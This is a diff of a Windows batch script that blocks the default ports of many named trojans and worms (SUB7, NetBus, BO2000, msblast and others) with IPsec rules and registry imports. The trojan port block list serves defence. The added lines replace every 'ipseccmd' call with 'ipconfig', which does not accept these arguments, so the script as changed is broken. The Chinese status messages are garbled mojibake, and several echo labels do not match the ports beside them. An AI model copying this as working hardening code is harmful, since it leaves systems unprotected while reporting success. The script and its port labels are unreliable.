+echo å…³é—­æœ¨é©¬Senna Spy Trojansé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6771" -f *+0:6771:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬DeepThroaté»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/23456" -f *+0:23456:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬WhackJobé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬GateCrasheré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/555" -f *+0:555:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Phase0é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Priorityé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5400" -f *+0:5400:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Blade Runneré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7000" -f *+0:7000:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Remote Grabé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/4950" -f *+0:4950:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬IcqTrojané»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7300" -f *+0:7300:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetMonitoré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/9989" -f *+0:9989:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬InIkilleré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7301" -f *+0:7301:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetMonitor 1.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/9872" -f *+0:9872:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Portal Of Doomé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetMonitor 2.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/11223" -f *+0:11223:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Progenic Trojané»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7307" -f *+0:7307:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetMonitor 3.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/22222" -f *+0:22222:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Prosiak 0.47é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7308" -f *+0:7308:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetMonitor 4.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/53001" -f *+0:53001:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Remote Windows Shutdowné»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7789" -f *+0:7789:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ICKilleré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5569" -f *+0:5569:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬RoboHacké»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/9872" -f *+0:9872:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Portal of Doomé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -x >nul
 
 gpupdate >nul
 
-echo ÕıÔÚÉèÖÃ IP É¸Ñ¡Æ÷¡­¡­
+echo æ­£åœ¨è®¾ç½® IP ç­›é€‰å™¨â€¦â€¦
 rem if exist %temp%\ipfilter.reg del %temp%\ipfilter.reg
 echo Windows Registry Editor Version 5.00>%temp%\ipfilter.reg
 echo.>>%temp%\ipfilter.reg
@@ -1301,397 +1301,397 @@ echo  00,30,00,00,00,00,00>>%temp%\ipfilter.reg
 echo.>>%temp%\ipfilter.reg
 regedit /s %temp%\ipfilter.reg
 del %temp%\ipfilter.reg
-echo IP É¸Ñ¡Æ÷ÉèÖÃ³É¹¦£¡
+echo IP ç­›é€‰å™¨è®¾ç½®æˆåŠŸï¼
 echo.
 echo.
-echo  ¡°¾Ü¾ø·şÎñ¡±ÌáĞÑÄúµÄÏµÍ³¿ÉÒÔÃâÊÜÁ÷ĞĞÈä³æ²¡¶¾¼°Ä¾ÂíºóÃÅµÄÇÖÈÅ£¡¾²¾²µØÏëÆğ,µ­µ­µØÒÅÍü£¬ ÊØºò£¬‚û¸Ğ¶øÃÀû~~~~~~~~~~~~~~~~~~~~~~  
-echo  ******** ÌØ±ğ×¢Òâ£º²»Òª¹Ø±Õ£¬Çë°´ÈÎÒâ¼ü½øĞĞ Win ·şÎñÆ÷¹ıÂË²ßÂÔ£¡ ********
+echo  â€œæ‹’ç»æœåŠ¡â€æé†’æ‚¨çš„ç³»ç»Ÿå¯ä»¥å…å—æµè¡Œè •è™«ç—…æ¯’åŠæœ¨é©¬åé—¨çš„ä¾µæ‰°ï¼é™é™åœ°æƒ³èµ·,æ·¡æ·¡åœ°é—å¿˜ï¼Œ å®ˆå€™ï¼Œå‚·æ„Ÿè€Œç¾éº—~~~~~~~~~~~~~~~~~~~~~~  
+echo  ******** ç‰¹åˆ«æ³¨æ„ï¼šä¸è¦å…³é—­ï¼Œè¯·æŒ‰ä»»æ„é”®è¿›è¡Œ Win æœåŠ¡å™¨è¿‡æ»¤ç­–ç•¥ï¼ ********
 echo.
 pause>nul
 
 rem For PC Server
-ipseccmd -w REG -p "HFUT_SECU" -o -x
-ipseccmd -w REG -p "HFUT_SECU" -x
-rem ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/80" -f *+0:80:TCP -n BLOCK -x
-rem ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/1434" -f *+0:1434:UDP -n BLOCK -x
-rem ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/3389" -f *+0:3389:TCP -n BLOCK -x
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/445" -f *+0:445:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/445" -f *+0:445:UDP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1025" -f *+0:1025:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/139" -f *+0:139:UDP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1068" -f *+0:1068:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5554" -f *+0:5554:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9995" -f *+0:9995:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9996" -f *+0:9996:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6129" -f *+0:6129:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block ICMP/255" -f *+0:255:ICMP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/43958" -f *+0:43958:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÁ÷ĞĞÎ£ÏÕ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20034" -f *+0:20034:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetBus Pro¿ª·ÅµÄ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1092" -f *+0:1092:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÈä³æLoveGate¿ª·ÅµÄ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/3996" -f *+0:3996:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4060" -f *+0:4060:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíRemoteAnything¿ª·ÅµÄ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4590" -f *+0:4590:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíICQTrojan¿ª·ÅµÄ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1080" -f *+0:1080:TCP -n BLOCK -x >nul
-echo ½ûÖ¹´úÀí·şÎñÆ÷É¨Ãè¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/113" -f *+0:113:TCP -n BLOCK -x >nul
-echo ½ûÖ¹Authentication Service·şÎñ¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/79" -f *+0:79:TCP -n BLOCK -x >nul
-echo ½ûÖ¹FingerÉ¨Ãè¡­¡­¡­¡­OK£¡
-ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/53" -f *+0:53:UDP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/53" -f *+0:53:TCP -n BLOCK -x >nul
-echo ½ûÖ¹ÇøÓò´«µİ£¨TCP£©£¬ÆÛÆ­DNS£¨UDP£©»òÒş²ØÆäËûµÄÍ¨ĞÅ¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/707" -f *+0:707:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕnachiÈä³æ²¡¶¾¼àÌı¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/808" -f *+0:808:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23" -f *+0:23:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕTelnet ºÍÄ¾ÂíTiny Telnet Server¼àÌı¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/520" -f *+0:520:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕRip ¶Ë¿Ú¡­¡­¡­¡­OK£¡
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1999" -f *+0:1999:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾Âí³ÌĞòBackDoorµÄÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK£¡
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÂí³ÌĞòºÚ¶´2001µÄÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾Âí³ÌĞòRipperµÄÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2583" -f *+0:2583:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾Âí³ÌĞòWincrash v2µÄÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK£¡
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/3389" -f *+0:3389:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕWindows µÄÔ¶³Ì¹ÜÀíÖÕ¶Ë£¨Ô¶³Ì×ÀÃæ£©¼àÌı¶Ë¿Ú¡­¡­¡­¡­OK£¡
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4444" -f *+0:4444:TCP -n BLOCK -x >nul
-echo ¹Ø±Õmsblast³å»÷²¨Èä³æ¼àÌı¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4899" -f *+0:4899:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÔ¶³Ì¿ØÖÆÈí¼ş£¨remote administrator)·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5800" -f *+0:5800:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5900" -f *+0:5900:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8888" -f *+0:8888:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÔ¶³Ì¿ØÖÆÈí¼şVNCµÄÁ½¸öÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6129" -f *+0:6129:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕDameware·şÎñ¶ËÄ¬ÈÏ¼àÌı¶Ë¿Ú£¨¿É±ä£¡£©¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6267" -f *+0:6267:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾Âí¹ãÍâÅ®ÉúµÄÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/660" -f *+0:660:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíDeepThroat v1.0 - 3.1Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6671" -f *+0:6671:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíIndoctrinationÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6939" -f *+0:6939:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíPRIORITYÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíÍøÂç¾«ÁéÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7511" -f *+0:7511:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾Âí´ÏÃ÷»ùÒòµÄÄ¬ÈÏÁ¬½Ó¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7626" -f *+0:7626:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾Âí±ùºÓÄ¬ÈÏ¶Ë¿Ú(×¢Òâ¿É±ä£¡)¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8011" -f *+0:8011:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíWAY2.4Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK£¡
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9989" -f *+0:9989:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíInIkillerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/19191" -f *+0:19191:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíÀ¼É«»ğÑæÄ¬ÈÏ¿ª·ÅµÄtelnet¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1029" -f *+0:1029:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20168" -f *+0:20168:TCP -n BLOCK -x >nul
-echo ¹Ø±Õlovegate Èä³æËù¿ª·ÅµÄÁ½¸öºóÃÅ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23444" -f *+0:23444:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíÍøÂç¹«Å£Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/27374" -f *+0:27374:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSUB7Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30100" -f *+0:30100:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetSphereÄ¬ÈÏµÄ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/31337" -f *+0:31337:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBO2000Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/45576" -f *+0:45576:TCP -n BLOCK -x >nul
-echo ¹Ø±Õ´úÀíÈí¼şµÄ¿ØÖÆ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSchwindlerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíTelecommandoÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
+ipconfig -w REG -p "HFUT_SECU" -o -x
+ipconfig -w REG -p "HFUT_SECU" -x
+rem ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/80" -f *+0:80:TCP -n BLOCK -x
+rem ipconfig -w REG -p "HFUT_SECU" -r "Block UDP/1434" -f *+0:1434:UDP -n BLOCK -x
+rem ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/3389" -f *+0:3389:TCP -n BLOCK -x
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/445" -f *+0:445:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block UDP/445" -f *+0:445:UDP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1025" -f *+0:1025:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block UDP/139" -f *+0:139:UDP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1068" -f *+0:1068:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5554" -f *+0:5554:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/9995" -f *+0:9995:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/9996" -f *+0:9996:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6129" -f *+0:6129:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block ICMP/255" -f *+0:255:ICMP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/43958" -f *+0:43958:TCP -n BLOCK -x >nul
+echo å…³é—­æµè¡Œå±é™©ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/20034" -f *+0:20034:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetBus Proå¼€æ”¾çš„ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1092" -f *+0:1092:TCP -n BLOCK -x >nul
+echo å…³é—­è •è™«LoveGateå¼€æ”¾çš„ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/3996" -f *+0:3996:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/4060" -f *+0:4060:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬RemoteAnythingå¼€æ”¾çš„ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/4590" -f *+0:4590:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ICQTrojanå¼€æ”¾çš„ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1080" -f *+0:1080:TCP -n BLOCK -x >nul
+echo ç¦æ­¢ä»£ç†æœåŠ¡å™¨æ‰«æâ€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/113" -f *+0:113:TCP -n BLOCK -x >nul
+echo ç¦æ­¢Authentication ServiceæœåŠ¡â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/79" -f *+0:79:TCP -n BLOCK -x >nul
+echo ç¦æ­¢Fingeræ‰«æâ€¦â€¦â€¦â€¦OKï¼
+ipconfig -w REG -p "HFUT_SECU" -r "Block UDP/53" -f *+0:53:UDP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/53" -f *+0:53:TCP -n BLOCK -x >nul
+echo ç¦æ­¢åŒºåŸŸä¼ é€’ï¼ˆTCPï¼‰ï¼Œæ¬ºéª—DNSï¼ˆUDPï¼‰æˆ–éšè—å…¶ä»–çš„é€šä¿¡â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/707" -f *+0:707:TCP -n BLOCK -x >nul
+echo å…³é—­nachiè •è™«ç—…æ¯’ç›‘å¬ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/808" -f *+0:808:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/23" -f *+0:23:TCP -n BLOCK -x >nul
+echo å…³é—­Telnet å’Œæœ¨é©¬Tiny Telnet Serverç›‘å¬ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/520" -f *+0:520:TCP -n BLOCK -x >nul
+echo å…³é—­Rip ç«¯å£â€¦â€¦â€¦â€¦OKï¼
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1999" -f *+0:1999:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ç¨‹åºBackDoorçš„é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OKï¼
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
+echo å…³é—­é©¬ç¨‹åºé»‘æ´2001çš„é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ç¨‹åºRipperçš„é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2583" -f *+0:2583:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ç¨‹åºWincrash v2çš„é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OKï¼
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/3389" -f *+0:3389:TCP -n BLOCK -x >nul
+echo å…³é—­Windows çš„è¿œç¨‹ç®¡ç†ç»ˆç«¯ï¼ˆè¿œç¨‹æ¡Œé¢ï¼‰ç›‘å¬ç«¯å£â€¦â€¦â€¦â€¦OKï¼
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/4444" -f *+0:4444:TCP -n BLOCK -x >nul
+echo å…³é—­msblastå†²å‡»æ³¢è •è™«ç›‘å¬ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/4899" -f *+0:4899:TCP -n BLOCK -x >nul
+echo å…³é—­è¿œç¨‹æ§åˆ¶è½¯ä»¶ï¼ˆremote administrator)æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5800" -f *+0:5800:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5900" -f *+0:5900:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/8888" -f *+0:8888:TCP -n BLOCK -x >nul
+echo å…³é—­è¿œç¨‹æ§åˆ¶è½¯ä»¶VNCçš„ä¸¤ä¸ªé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6129" -f *+0:6129:TCP -n BLOCK -x >nul
+echo å…³é—­DamewareæœåŠ¡ç«¯é»˜è®¤ç›‘å¬ç«¯å£ï¼ˆå¯å˜ï¼ï¼‰â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6267" -f *+0:6267:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬å¹¿å¤–å¥³ç”Ÿçš„é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/660" -f *+0:660:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬DeepThroat v1.0 - 3.1é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6671" -f *+0:6671:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Indoctrinationé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6939" -f *+0:6939:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬PRIORITYé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ç½‘ç»œç²¾çµé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7511" -f *+0:7511:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬èªæ˜åŸºå› çš„é»˜è®¤è¿æ¥ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7626" -f *+0:7626:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬å†°æ²³é»˜è®¤ç«¯å£(æ³¨æ„å¯å˜ï¼)â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/8011" -f *+0:8011:TCP -n BLOCK -x >nul
